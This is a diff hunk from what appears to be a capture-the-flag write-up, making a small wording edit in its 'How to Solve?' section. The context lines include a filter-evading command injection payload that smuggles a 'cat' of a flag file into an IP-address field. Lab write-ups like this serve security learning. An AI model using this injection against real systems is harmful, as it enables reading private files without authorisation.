@@ -11,7 +11,7 @@ And then I tried to input 127.0.0.1 and here was the output
 ![preview_2](images/preview_2.png)
 
 ## How to Solve?
-We need to exploit the website using `Command Injection` vulnerability in order to read the flag. Here is the payload that I used to read the flag
+We need to exploit the website using `Command Injection` vulnerability in order to read the flag. Here is the payload I used to read the flag
 
 ```
 127.0.0.1;c\a\t${IFS}/f\lag.txt${IFS}|base64
